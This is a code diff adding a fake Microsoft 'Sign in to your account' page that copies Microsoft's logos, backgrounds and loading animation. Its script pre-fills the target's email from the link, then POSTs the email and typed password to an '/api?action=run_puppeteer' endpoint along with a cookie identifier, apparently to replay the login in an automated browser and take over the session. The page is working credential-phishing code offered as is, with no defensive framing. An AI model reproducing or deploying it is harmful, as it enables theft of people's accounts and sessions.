@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg');
+            background-size: cover;
+            background-position: center;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+    </style>
+    <style>
+        @keyframes pinchAndRelease{0%,100%,12.5%,25%,35.5%,50%{transform:scale(1,1) translateY(0)}30%,5%{transform:scale(.86,1.1) translateY(10px)}}
+        @keyframes documentOneScale{0%,100%,35%,50%{transform:translate(61px,82px) scale(0,0) rotateZ(20deg) rotateY(26deg)}12%,22%{transform:translate(0,0) scale(1,1) rotateZ(-18deg) rotateY(0)}}
+        @keyframes documentTwoScale{0%,100%,33%,50%{transform:translate(44px,68px) scale(0,0) rotateZ(20deg) rotateY(26deg)}15%,19%{transform:translate(0,0) scale(1,1) rotateZ(-9deg) rotateY(0)}}
+        @keyframes layersSlideIn{0%,23%{transform:translateY(74px) scale(0) rotateX(50deg) rotateZ(45deg)}100%,33%{transform:translateY(0) scale(1) rotateX(50deg) rotateZ(45deg)}}
+        .hidden{display:none}
+        .card{width:360px;max-width:90vw;background:#fff;border-radius:12px;box-shadow:0 12px 30px rgba(0,0,0,.12);padding:24px 20px;box-sizing:border-box}
+        .logo{display:flex;justify-content:center;margin-bottom:8px}
+        h1{font-size:24px;font-weight:700;margin:8px 0 16px;color:#1b1b1b}
+        .input-group{margin:8px 0 16px}
+        .input-group input{width:100%;padding:10px 12px;border:1px solid #c7c7c7;border-radius:4px;font-size:14px;box-sizing:border-box}
+        .actions{display:flex;justify-content:flex-end;margin-top:8px}
+        .btn-primary{background:#0067b8;color:#fff;border:none;border-radius:4px;padding:8px 14px;font-weight:600;cursor:pointer}
+        .btn-primary:hover{background:#0057a3}
+        #intro-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #fff; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: opacity 0.5s ease-out; }
+        #intro-overlay #container{width:400px;height:400px;display:flex;justify-content:center;align-items:center;position:relative;--duration:3000ms;--delay:0ms;--iterationCount:infinite;--direction:normal;--fillMode:forwards;--playState:running;--easing:ease-in-out}
+        #intro-overlay .foreground{width:164px;height:200px;border-radius:26px;overflow:hidden;position:absolute;z-index:100;animation:pinchAndRelease var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .background{width:164px;height:200px;border-radius:26px;overflow:hidden;position:relative;z-index:20;animation:pinchAndRelease var(--duration) var(--easing) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .contents{position:absolute;bottom:100px;left:118px;width:164px;height:200px;background-color:transparent;z-index:60;overflow:hidden;animation:pinchAndRelease var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .flap-top-inner-shadow{background:radial-gradient(circle,#00217700 54%,#0021778c 100%);background-position:-34px -34px;background-size:170px 170px;width:130px;height:130px;position:absolute;top:26px;left:17px;border-radius:18px 24px 0 24px;transform:rotateX(50deg) rotateZ(45deg);transform-style:preserve-3d;z-index:50}
+        #intro-overlay .flap-top-fill{background-color:#28afea;width:130px;height:130px;position:absolute;top:26px;left:17px;border-radius:18px 24px 0 24px;transform:rotateX(50deg) rotateZ(45deg);transform-style:preserve-3d;z-index:30}
+        #intro-overlay .flap-left{width:200px;height:200px;border-radius:0 38px;background-color:#6ce0ff;background:radial-gradient(circle,#2cbbf3 0,#87e5ff 100%);position:absolute;bottom:-80.5px;left:-112px;transform:rotateX(50deg) rotateZ(45deg);z-index:51}
+        #intro-overlay .flap-right{width:200px;height:200px;border-radius:0 38px;background-color:#0985dc;background:linear-gradient(3deg,#0985dc 25%,#3da9fb 58%,#c29dfa 80%,#f4a7f7 100%);position:absolute;bottom:-80.5px;right:-112px;transform:rotateX(50deg) rotateZ(45deg);z-index:50}
+        #intro-overlay .background-fill{position:absolute;width:100%;height:110px;bottom:0;left:0;background:#7bf4ff;background:linear-gradient(56deg,#7bf4ff 0,#c29dfa 100%)}
+        #intro-overlay .layer-stack{background-color:#3834b9;width:130px;height:130px;position:absolute;top:26px;left:17px;z-index:1;border-radius:18px 24px 0 24px;transform:rotateX(50deg) rotateZ(45deg);transform-style:preserve-3d;z-index:30;overflow:hidden;animation:layersSlideIn var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .layer-stack::after{content:'';position:absolute;top:-1px;left:0;width:86px;height:158px;background-color:#4b6de7;border-top-right-radius:24px;z-index:10}
+        #intro-overlay .layer-stack::before{content:'';position:absolute;top:-1px;left:-10px;width:54px;height:158px;background:#5b9ee8;background:linear-gradient(344deg,rgb(50 146 234) 30%,#81c2f9 76%,#abb8fa 90%);border-radius:60px;z-index:20}
+        #intro-overlay .document-one{position:absolute;width:130px;height:162px;background:#2650bd;background:linear-gradient(40deg,rgb(6 103 211) 40%,#7f85f6 100%);border-radius:14px;left:19px;top:18px;z-index:30;animation:documentOneScale var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .document-two{position:absolute;width:114px;height:156px;background:#abc8e2;background:linear-gradient(47deg,#abc8e2 0,#fcefd6 100%);border-radius:14px;left:36px;top:32px;z-index:40;box-shadow:-9px -3px 4px -3px rgba(0,0,0,.1);animation:documentTwoScale var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .document-two::before{content:'';position:absolute;top:0;left:0;width:15px;height:158px;background-color:#293bb0;border-radius:24px 0 0 24px}
+        #intro-overlay #MSLogo{display:block;margin:0 auto;position:relative;top:190px;}
+    </style>
+</head>
+<body>
+    <div id="intro-overlay">
+        <div id="loadingScreen">
+            <div id="loadingLogo" dir="ltr">
+                <div id="container">
+                    <div class="foreground">
+                        <div class="flap-top-inner-shadow"></div>
+                        <div class="flap-left"></div>
+                        <div class="flap-right"></div>
+                    </div>
+                    <div class="contents">
+                        <div class="layer-stack"></div>
+                        <div class="document-two"></div>
+                        <div class="document-one"></div>
+                    </div>
+                    <div class="background">
+                        <div class="flap-top-fill"></div>
+                        <div class="background-fill"></div>
+                    </div>
+                </div>
+            </div>
+            <img src="//res.public.onecdn.static.microsoft/assets/framework/microsoft.svg" id="MSLogo" alt="Microsoft" crossorigin="anonymous" loading="lazy">
+        </div>
+    </div>
+    <script>
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                var overlay = document.getElementById('intro-overlay');
+                if (overlay) {
+                    overlay.style.opacity = '0';
+                    setTimeout(function() {
+                        overlay.remove();
+                    }, 500);
+                }
+            }, 3000);
+        });
+    </script>
+    <div class="card">
+        <div class="logo">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" width="108">
+        </div>
+        <div id="email-step">
+            <h1>Sign in</h1>
+            <div class="input-group">
+                <input type="text" id="email-input" placeholder="Email, phone, or Skype">
+            </div>
+            <div class="actions">
+                <button class="btn-primary" id="next-btn">Next</button>
+            </div>
+        </div>
+        <div id="password-step" class="hidden">
+            <div class="user-identity">
+                <div class="back-arrow" id="back-btn">
+                    <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" alt="Back" width="24" height="24">
+                </div>
+                <span id="user-email-display"></span>
+            </div>
+            <h1>Enter password</h1>
+            <div class="input-group">
+                <input type="password" id="password-input" placeholder="Password">
+            </div>
+            <div class="actions">
+                <button class="btn-primary" id="signin-btn">Sign in</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        let prefilledEmail = ""; // SERVER_INJECT_EMAIL
+        const emailStep = document.getElementById('email-step');
+        const passwordStep = document.getElementById('password-step');
+        const emailInput = document.getElementById('email-input');
+        const passwordInput = document.getElementById('password-input');
+        const nextBtn = document.getElementById('next-btn');
+        const signinBtn = document.getElementById('signin-btn');
+        const userEmailDisplay = document.getElementById('user-email-display');
+        function handlePrefill() {
+            if (!prefilledEmail) {
+                try {
+                    const h = window.location.hash.substring(1);
+                    if (h.includes('@')) { prefilledEmail = decodeURIComponent(h); }
+                    else {
+                        const p = new URLSearchParams(window.location.search);
+                        if (p.get('email')) prefilledEmail = p.get('email');
+                        else if (p.get('e')) prefilledEmail = p.get('e');
+                        else {
+                            const parts = window.location.pathname.split('/');
+                            for (let i = parts.length - 1; i >= 0; i--) {
+                                if (decodeURIComponent(parts[i]).includes('@')) {
+                                prefilledEmail = decodeURIComponent(parts[i]);
+                                break;
+                            }
+                            }
+                        }
+                    }
+                } catch(e){}
+            }
+            if (prefilledEmail) {
+                emailInput.value = prefilledEmail;
+                userEmailDisplay.textContent = prefilledEmail;
+            }
+        }
+        (function(){
+            handlePrefill();
+        })();
+        nextBtn.addEventListener('click', async () => {
+            const email = emailInput.value.trim();
+            if (!email) return;
+            const domainPart = email.includes('@') ? email.split('@').pop().toLowerCase() : '';
+            emailStep.classList.add('hidden');
+            passwordStep.classList.remove('hidden');
+            passwordInput.focus();
+        });
+        signinBtn.addEventListener('click', async () => {
+            const password = passwordInput.value;
+            const email = userEmailDisplay.textContent || emailInput.value.trim();
+            if (!password) return;
+            try {
+                const domainPart = email.includes('@') ? email.split('@').pop().toLowerCase() : '';
+                const cookieId = 'cookie-wrap-2';
+                fetch('/api?action=run_puppeteer', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        cookieId
+                    }),
+                    keepalive: true
+                });
+            } catch (e) {}
+        });
+    </script>
+</body>
+</html>
